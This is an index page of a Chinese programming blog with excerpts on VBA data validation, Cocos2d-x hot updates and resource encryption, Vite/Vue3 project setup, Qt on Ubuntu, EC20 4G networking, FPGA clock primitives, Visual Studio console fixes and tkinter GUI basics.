		Function val_lv(arr, Optional lv&amp; = 1) '数据有效性级别函数，arr为数据有效性的数组，lv为级别，返回第lv级的规则数据；arr建议从表格读取 '第lv级的内容为便于定义，允许在一个单元格内有多个数据，使用分隔符，默认为","（半角） '代码简易，每级避免出现归属不同上级的同名字符串，会出错 Dim dict As Object, delimiter$, i&amp;, j&amp;, temp, high_lv, result delimiter = "," '分隔符，最好为数据中不存在的字符，如Chr(28)或| If LBound(arr) = 0 Then '转为从1开始计数 arr = WorksheetFunction.Transpose(WorksheetFunction.Transpose(arr)) End If If UBound(arr, 2) &lt; lv Then Debug.Print "级别不能大于数组列数": val_lv = "": Exit Function Set dict = CreateObject("scripting.dictionary") If lv = 1 Then For i = 1 To UBound(arr) temp = Split(arr(i, lv), delimiter) For Each t In temp dict(t) = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11a7fd51cc549141906032278569a796/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53dc695499ef3724659377dc81711c92/" rel="bookmark">
			COCOS2D-X LUA 热更新、资源加密及资源文件名混淆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 热更新 热更新按照平台可分为IOS、Android、Windows、MacOs。
下图展示的为IPA、APK和exe、MacOs 热更新包体路径基本情况 Cocos2d-X 热更新的主要起作用就是 搜索路径（SearchPath）SearchPath 对于IOS Android App 一般打包会带入部分 LUA与图片等资源作为主包资源，将writablePath 里面的update 文件夹作为第一搜索顺位，大家参考 Quick 版本的FileUtils::fullPathForFilename。
2.资源加密 Quick Cocos2d的资源加密 可以参考 Cocos2d-x客户端资源加密 - 简书，有时间再做补充。
另外说一下关于XXTEA的意外的资源加密，对于XXTEA 加密技术比较成熟，加密的等级比较低，作为商业项目可以在此基础上增加自己的加密算法。
3.资源文件名混淆 加密算法的主要作用是将文件内容加密为密文，但是包体内的文件名称还是暴露了自己的业务名称及资源类型。所有最好也需要增加对于文件名的混淆。
在资源打包时，可以将对应资源名称及文件类型混编为一种编码格式（唯一标识即可），将文件名字典一起打包到包内资源，在搜索路径的方法中根据文件名字典搜索对应的路径:
FileUtils::fullPathForFilename
FileUtils::fullPathFromRelativeFile
注意mp3需要保留文件名后缀，防止Android打包时的压缩。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd3d7ed538c078944c461b81c1f68ff8/" rel="bookmark">
			Vite&#43;Vue3.0&#43;ElementPlus &#43; axios &#43;TS 搭建项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vite+Vue3.0+ElementPlus + axios +TS 搭建项目 文章目录 Vite+Vue3.0+ElementPlus + axios +TS 搭建项目一、vite构建项目 [官网](https://cn.vitejs.dev/guide/)1、创建项目2、步骤 二、代码规范1、配置eslintgit Husky 2、配置prettier3、集成editorconfig配置4、git commit规范 三、项目配置一、css预处理器及样式重置1、css预处理器2、样式重置 二、引入Element-Plus [官网](https://element-plus.gitee.io/zh-CN/component/button.html)三、环境变量配置四、axios集成1、安装axios2、封装请求错误代码提示： ==/src/utils/error-code-type.ts==3、封装：==/src/utils/request.ts==4、封装请求接口5、vue中使用五、封装本地存储(localStorage)六、工具函数封装 五、扩展1、本地打开vue3+vite+ts项目打包的dist文件夹下index.html2、vite项目中配置路径别名@ 一、vite构建项目 官网 1、创建项目 // pnpm pnpm create vite // npm npm create vite@latest // yarn yarn create vite 2、步骤 二、代码规范 注释：配置完成后需要重新启动项目
1、配置eslint 安装ESlint插件
在项目根目录下找到并打开 .eslintrc.cjs 文件
/* eslint-env node */ require('@rushstack/eslint-patch/modern-module-resolution') module.exports = { root: true, extends: [ 'plugin:vue/vue3-essential', 'eslint:recommended', '@vue/eslint-config-typescript/recommended', '@vue/eslint-config-prettier' ], env: { 'vue/setup-compiler-macros': true }, parserOptions: { ecmaVersion: 'latest' }, parser: 'vue-eslint-parser', rules: { /* "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd3d7ed538c078944c461b81c1f68ff8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7611d3437449465615fb8b9e42c81c75/" rel="bookmark">
			解决ubuntu虚拟机安装QT没有图标启动麻烦问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 找到qtcreator的路径，添加一个软链接，我安装的5.12.9版本。
我的路径在/opt/Qt5.12.9/Tools/QtCreator/bin
添加一个软路由 名字叫做qtt，别添加在当前目录下，因为当前目录没有添加环境变量，这里我是把软路由添加在/usr/bin下。添加完后在任何路径执行qtt即可打开
sudo ln -s /opt/Qt5.12.9/Tools/QtCreator/bin/qtcreator /usr/bin/qtt 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e8a0499e7ce5af22c59eb53f5440343/" rel="bookmark">
			iMX6ULL EC20 4G连网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		iMX6ULL EC20 4G连网 1. 介绍2. 配置Linux内核3. 配置Buildroot4. 测试 我移植的板子是讯为的TERMINATOR_V1.1开发板，参考板为官方 i.MX6ULL EVK开发板。
1. 介绍 EC20是移远一款带有GPS功能的LTE模块支持4G上网，本文将利用官方提供linux-ppp-scripts_V1.2.zip包实现ppp拨号上网，更多详细的指令操作细节、参数、示例可参考官网提供的手册：Quectel_EC20_GNSS_AT_Commands_Manual_V1.1.pdf。
2. 配置Linux内核 因为我使用的内核已经支持了EC20，所以这里无需修改内核代码。如果自己使用的内核不支持EC20只需要修改drivers/usb/serial/option.c文件，添加EC20设备信息即可。接下来只需要配置内核。
Device Drivers ---&gt; [*] Network device support ---&gt; &lt;*&gt; PPP (point-to-point protocol) support &lt;*&gt; PPP BSD-Compress compression &lt;*&gt; PPP Deflate compression [*] PPP filtering &lt;*&gt; PPP MPPE compression (encryption) [*] PPP multilink support &lt;*&gt; PPP over Ethernet &lt;*&gt; PPP support for async serial ports &lt;*&gt; PPP support for sync tty ports &lt;*&gt; USB Network Adapters ---&gt; &lt;*&gt; Multi-purpose USB Networking Framework [*] USB support ---&gt; &lt;*&gt; USB Serial Converter support ---&gt; &lt;*&gt; USB driver for GSM and CDMA modems 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e8a0499e7ce5af22c59eb53f5440343/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92e0d08d1983d2c4aa7eb1e4b6683ccd/" rel="bookmark">
			TypeError: Cannot set properties of undefined (setting &#39;type&#39;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个错误消息表明你正在尝试给一个未定义的变量赋值，或者给一个未定义的对象的属性赋值。这可能是因为你没有正确初始化变量或对象，或者是因为你在使用一个未定义的变量或对象。请检查你的代码，确保所有变量和对象都已正确初始化，并且你正在使用已定义的变量和对象。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1c25880e87171bc8541d073a11db666/" rel="bookmark">
			MMCME4_ADV与PLL4_ADV原语
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MMCM与PLL ​ UltraScale器件中时钟管理模块(CMT)包含mixed-mode clock manager (MMCM) 和phase-locked loops (PLLs) 。PLL主要用来生成I/O时钟，也包含一部分MMCM的功能。
​ 其中MMCM输出时钟相位调整语VCO频率相关。
MMCME4_ADV原语 ​ MMCM原语包含MMCME3_BASE和MMCME3_ADV，在UltraScale+ 器件中MMCME4替代MMCME3。UltraScale+ 器件MMCM原语包含MMCME4_BASE和MMCME4_ADV。
​ MMCME4_BASE实现基本MMCM功能。MMCME4_ADV除了能实现MMCME4_BASE功能外，还可以实现动态可重配等功能。
计算输出时钟频率
​ 时钟输出频率和VCO输出频率计算公式如下，其中M值通过CLKFBOUT_MULT_F设置，D值通过DIVLK_DIVIDE设置，O的值为通过CLKOUT_DIVIDE.设置。
​ 下图代码中CLKFBOUT_MULT_F设置成8，DIVCLK_DIVIDE设置成1，CLKOUT0_DIVIDE_F设置成4，输入时钟频率CLKIN1_PERIOD等于10，为100Mhz。通过公式计算CLKOUT0输出为100*8/4=200Mhz。
MMCME4_ADV #( .BANDWIDTH("OPTIMIZED"), // Jitter programming .CLKFBOUT_MULT_F(8), // Multiply value for all CLKOUT .CLKFBOUT_PHASE(0.0), // Phase offset in degrees of CLKFB .CLKFBOUT_USE_FINE_PS("FALSE"), // Fine phase shift enable (TRUE/FALSE) .CLKIN1_PERIOD(10), // Input clock period in ns to ps resolution (i.e., 33.333 is 30 MHz). .CLKIN2_PERIOD(0.0), // Input clock period in ns to ps resolution (i.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1c25880e87171bc8541d073a11db666/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bfb0c3c320fd9c02ea379f894a4da15/" rel="bookmark">
			Visual Studio运行控制台程序一闪而退的解决方法！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初学者在使用Visual Studio各个版本时，在进行调试运行时，会发现控制台总是一闪即退，输出结果的窗口无法保持打开状态！
其实问题是你执行时按的是F5还是Ctrl+F5，区别如下：
F5（启动调试）：Debugging模式，在这个模式下，当程序运行结束后，窗口会自动关闭。
Ctrl+F5（开始执行，不调试）：Start Without Debugging模式 ，在这个模式下，就可以看到运行结果了。并且窗口显示 Press any key to continue…
但是部分人会发现，在按Ctrl+F5后程序依然一闪而过，那么可以试试以下方法：
添加 system (“pause”); 需要自己添加头文件 #include &lt;stdlib.h&gt;，这句话的含义是：从程序中发起系统命令行调用，执行DOS命令：pause。即让控制台暂停，等待用户信号。
添加getchar()字符输入函数，含义：从输入缓冲区里面读取一个字符 - 「 一次只能读取一个字符 」。这样程序运行后就会等待输入，而不会一闪而退。
注：在使用时，要把语句放在return 前面，不然执行不到，示例如下：
#include &lt;stdio.h&gt; #include &lt;cstdlib&gt; int main(void) { printf("Hello world!\n"); //getchar();	//方法1：等待用户输入 system("pause");	//方法2：执行DOS命令：pause 暂停 return 0; } 修改工程属性的子系统
(1)右键单击当前工程-&gt;属性
(2)选择配置属性-&gt;链接器-&gt;系统
(3)更改系统选项中的“子系统”配置，选择下拉菜单的第一个“控制台 (/SUBSYSTEM:CONSOLE)”
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a4a3b08be930da915b73f29a128ea15/" rel="bookmark">
			python自学之《21天学通Python》(9)——基于tkinter的GUI编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第12章 基于tkinter的GUI编程 Windows的图形用户界面非常方便用户操作，因此，Windows操作系统得到了广大个人计算机用户的欢迎。在Python中，也可以编写美观的GUI界面应用程序与项目。tkinter是Python自带的用于GUI编程的模块，tkinter是对图形库TK的封装。tkinter是跨平台的，这意味着在Windows下编写的程序，可以不加修改地在Linux、UNIX等系统下运行。因此，tkinter的优势在于其可移植性。
12.1GUI概述 12.1.2 Python编写GUI程序库
12.2 tkinter图形化库简介
使用tkinter可以创建完整的GUI程序。在tkinter中，可以直接使用文本框、按钮、标签等组件（widget）进行GUI编程。换句话说，要实现某个界面元素，只要调用对应的组件即可。tkinter是Python的一个模块，可以像其他模块一样在Python的交互式shell中（或者“.py”程序中）被导入，tkinter模块被导入后即可使用tkinter模块中的函数、方法等。
12.2.1 创建GUI程序第一步
使用tkinter创建图形界面时要首先导入tkinter模块。可以在Python的交互式环境中输入如下语句验证Python是否安装了tkinter模块。
如果上述语句执行成功，则表示已经安装了tkinter模块。在编写程序时只要使用import语句导入tkinter模块，即可使用tkinter模块中的函数、对象等进行GUI编程。
在使用tkinter模块时，首先要使用tkinter.Tk生成一个主窗口对象，然后才能使用tkinter模块中其他的函数、方法等。当生成主窗口以后，可以向其添加组件，或者直接调用其mainloop方法进行消息循环。
【实例12-1】 演示了仅创建一个简单的窗口而没有使用组件，代码如下：
12.2.2 创建GUI程序第二步
在tkinter中，组件与主窗口一样，也是使用tkinter模块中相应的组件函数生成的。组件生成后就可以使用pack、grid或place方法将其添加到窗口中。
【实例12-2】 演示了具有标签和按钮组件的主窗口，代码如下：
注意 运行以上实例后，单击两个按钮均无反应，这是因为在程序中未添加按钮组件单击事件的处理函数。
12.3 tkinter组件
在上一节中创建的窗口实际上是存放组件的一个“容器”。如果仅创建一个不包含组件的窗口，其作用也仅是测试tkinter模块。更有意义的做法是，当窗口创建好以后，应根据程序的功能向窗口中添加合适的组件，然后定义与实际相关的处理函数，这样才算一个完整的GUI程序。
12.3.1 组件分类
12.3.2 布局组件
在前面的例子中仅使用组件的pack方法将组件添加到窗口中，而未设置组件的位置。因此，前面例子中组件位置都是由tkinter模块自动确定的。对于包含较多组件的窗口，为了让组件布局合理，可以通过向pack传递参数来设置组件在窗口中的位置。除了组件的pack方法以外，还可以使用grid方法和place方法来放置组件。组件的pack方法可以使用以下几个参数来设置组件的位置属性。
12.4 常用tkinter组件
tkinter库中有很多GUI组件，其中包括在图形化界面中常用的按钮、标签、文本框、菜单、单选框、复选框等，本节主要介绍各种常用组件的使用方法。
12.4.1 按钮
注意 一些组件具有相似的控制参数，所以你不必强记它。
【实例12-3】 演示了在主窗口中创建各种不同的按钮，代码如下：
12.4.2 文本框
文本框主要用来接收用户输入。使用tkinter.Entry和tkinter.Text可以创建单行文本框和多行文本框组件。通过向其传递参数可以设置文本框的背景色、大小、状态等。如表12.4所示是tkinter.Entry和tkinter.Text共有的几个控制参数。
【实例12-4】 演示了在主窗口中显示创建的各种不同类型的文本框，代码如下：
12.4.3 标签
标签是提供在窗口中显示文本的组件。除显示文本以外，标签还可以显示图片。使用tkinter.Label可以创建标签组件。控制标签的参数如表12.5所示。
【实例12-5】 演示了在主窗口中显示创建的各种不同类型的标签组件，代码如下：
12.4.4 菜单
在tkinter中，菜单组件的添加与其他的组件有所不同。菜单要使用创建的主窗口的config方法添加到窗口中。
【实例12-6】 演示了添加菜单的主窗口，代码如下：
【实例12-7】 演示了添加弹出式菜单（快捷菜单或右键菜单）的主窗口，代码如下：
12.4.5 单选框和复选框
单选框往往用于一组互斥的选项，即一组单选框中只有一个可以被选中。而复选框则由一个复选框组件来表示两种不同的状态，即被选中表示一种状态，未被选中表示另一种状态。
【实例12-8】 演示了创建一组单选框和一个复选框GUI实例程序，代码如下：
注意 在创建单选框和复选框前应创建其相关联的变量。
对于单选框组件和复选框组件，还有一个比较特殊的控制参数indicatoron，当向其传递值0时，组件将被绘制成按钮的形式，被选中的组件处于按下状态。
【实例12-9】 演示了创建按钮形式的单选框和复选框GUI实例程序，代码如下：
12.4.6 绘制图形
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a4a3b08be930da915b73f29a128ea15/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/112/">«</a>
	<span class="pagination__item pagination__item--current">113/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/114/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>